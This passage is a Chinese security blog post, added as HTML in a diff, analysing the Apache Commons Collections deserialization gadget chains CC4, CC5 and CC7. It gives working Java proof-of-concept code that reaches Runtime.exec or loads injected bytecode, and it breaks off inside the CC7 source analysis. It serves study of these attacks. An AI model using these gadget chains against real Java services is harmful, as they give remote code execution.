@@ -1,0 +1,758 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mechoy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CommonsCollections4+5+70x00 前言CC这几条链基本上快看完了，后面的其实也就是一些新的调用链，所以就懒得分开写了，直接放在一起了 0x01 CommonsCollections4这条链是CC2的一个变体，将org.apache.commons.collections4.functors.InvokerTransformer替换为org.apache.commons.col">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsCollections4、5、7">
+<meta property="og:url" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/index.html">
+<meta property="og:site_name" content="Mechoy&#39;s Blog">
+<meta property="og:description" content="CommonsCollections4+5+70x00 前言CC这几条链基本上快看完了，后面的其实也就是一些新的调用链，所以就懒得分开写了，直接放在一起了 0x01 CommonsCollections4这条链是CC2的一个变体，将org.apache.commons.collections4.functors.InvokerTransformer替换为org.apache.commons.col">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/1.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/2.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/3.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/4.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/5.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/6.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/7.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/8.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/9.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/10.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/11.png">
+<meta property="og:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/12.png">
+<meta property="article:published_time" content="2022-10-21T16:44:22.000Z">
+<meta property="article:modified_time" content="2023-04-02T16:59:02.394Z">
+<meta property="article:author" content="Mechoy">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/1.png">
+  
+  
+  <title>CommonsCollections4、5、7 - Mechoy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mechoy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CommonsCollections4、5、7"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Mechoy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-22 00:44" pubdate>
+          2022年10月22日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CommonsCollections4、5、7</h1>
+            
+            <div class="markdown-body">
+              
+              <h2 id="CommonsCollections4-5-7"><a href="#CommonsCollections4-5-7" class="headerlink" title="CommonsCollections4+5+7"></a>CommonsCollections4+5+7</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>CC这几条链基本上快看完了，后面的其实也就是一些新的调用链，所以就懒得分开写了，直接放在一起了</p>
+<h3 id="0x01-CommonsCollections4"><a href="#0x01-CommonsCollections4" class="headerlink" title="0x01 CommonsCollections4"></a>0x01 CommonsCollections4</h3><p>这条链是CC2的一个变体，将<code>org.apache.commons.collections4.functors.InvokerTransformer</code>替换为<code>org.apache.commons.collections4.functors.InstantiateTransformer</code>，在以前的文章中已经说过了</p>
+<p>另外就是又换了一些路子，找到了一些新的路子，找</p>
+<p>jdk8u71、jdk8u341</p>
+<p>CommonsCollections4.0</p>
+<p>先来看一下大佬的路子，大佬没写路子，寄😣</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>这个跟CC2改相比，改动的地方也不多</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>        instantiateTransformer<br>    &#125;);<br><br>    TransformingComparator&lt;Object, Object&gt; transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator&lt;Object, Object&gt;(chainedTransformer);<br><br>    PriorityQueue&lt;Object&gt; objects = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);<br><br>    Class&lt;? extends PriorityQueue&gt; c = objects.getClass();<br>    Field size = c.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-keyword">true</span>);<br>    size.set(objects,<span class="hljs-number">2</span>);<br><br>    serialize(objects);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02-CommonsCollections5"><a href="#0x02-CommonsCollections5" class="headerlink" title="0x02 CommonsCollections5"></a>0x02 CommonsCollections5</h3><p>CC5，找了一个新的入口点，从LazyMap之前有所变动，其余的没什么变化，主要是来看一下前面的变动</p>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>jdk8u71</p>
+<p>CommonsCollections4.0</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面说只适用于JDK 8u76，且没有安全管理器，emmm，暂时还没有JDK8u76呢，先在以前的版本试一下吧</p>
+<p>先来看一下这个<code>org.apache.commons.collections.keyvalue.TiedMapEntry#toString</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>&#125;<br><span class="hljs-comment">// 上面知道getValue中会调用map.get，找到一个点调TiedMapEntry#toString就好了</span><br><span class="hljs-comment">// 不过掉toString的地方实在太多了，直接来看官方的吧</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 虽然该类没有实现序列化接口，但Exception实现了，所以都一样</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> Object val;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream.GetField gf = ois.readFields();<br>        Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>            val = <span class="hljs-keyword">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();	<span class="hljs-comment">// 这里调用了toString，并且valObj可控</span><br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>BadAttributeValueExpException#readObject-&gt;TiedMapEntry#toString-&gt;LazyMap.get</p>
+<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>这里需要注意的是：</p>
+<ul>
+<li><p>拼接代码的时候别拼错了，思路要清晰</p>
+</li>
+<li><p>注意把IDEA调试时自动调用toString关掉，调完再开</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/2.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<p>然后就没啥了拼接一下路子就可以了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-comment">// 先传个没啥用的，后面再改</span><br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;111&quot;</span>);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,chainedTransformer);<br><br>    <span class="hljs-comment">// 因为在构造器时也会掉toString，所以这里也是先造个没啥用的TiedMapEntry，后面再反射把有用的替换进去</span><br>    TiedMapEntry tiedMapEntry1 = <span class="hljs-keyword">new</span> TiedMapEntry(LazyMap.decorate(map, <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>)), <span class="hljs-number">222</span>);<br><br>    BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(tiedMapEntry1);<br><br>    Field val = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>    val.setAccessible(<span class="hljs-keyword">true</span>);<br>    val.set(badAttributeValueExpException,tiedMapEntry);<br><br>    serialize(badAttributeValueExpException);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>路子多了一条，所以图片又可以更新了</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/3.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x03-CommonsCollections7"><a href="#0x03-CommonsCollections7" class="headerlink" title="0x03 CommonsCollections7"></a>0x03 CommonsCollections7</h3><h4 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h4><p>jdk8u65、jdk8u341</p>
+<p>CommonsCollections4.0</p>
+<p>先来看一下大佬的，因为菜鸡的我真的不太明白这是怎么找出来的</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里其实也就是入口点不太一样，到后面的LazyMap时就一样</p>
+<p>先来看看用到的几个类和方法</p>
+<h4 id="HashTbale"><a href="#HashTbale" class="headerlink" title="HashTbale"></a><code>HashTbale</code></h4><p><code>Hashtable</code>是Java语言中的一个类，它实现了一个基于哈希表的键值对（key-value）存储结构。在这个结构中，每个键对应一个值，并且可以使用键来快速查找对应的值。该类是线程安全的，可以在多线程环境下使用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hashtable</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">Dictionary</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;, <span class="hljs-title">Cloneable</span>, <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>		<br>        ...<br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> StreamCorruptedException</span>&#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>        <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>        <span class="hljs-comment">// This should not happen in deserialized version.</span><br>        <span class="hljs-keyword">int</span> hash = key.hashCode();<br>        <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;	<span class="hljs-comment">// 先取下有符号整数，再取余</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;	<span class="hljs-comment">// 调用这个equals</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Creates the new entry.</span><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> Entry&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br>        <br>        ...<br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                K key = (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                V value = (V)s.readObject();<br>            <span class="hljs-comment">// synch could be eliminated for performance</span><br>            reconstitutionPut(table, key, value);	<span class="hljs-comment">// 跟进该方法</span><br>        &#125;<br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a><code>AbstractMapDecorator</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span> </span>&#123;<br>    ...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">transient</span> Map map;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">this</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.equals(object);		<span class="hljs-comment">// 从这里进入到LazyMap.equals</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="AbstractMap"><a href="#AbstractMap" class="headerlink" title="AbstractMap"></a><code>AbstractMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractMap</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; </span>&#123;<br><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object o)</span> </span>&#123;	<span class="hljs-comment">// 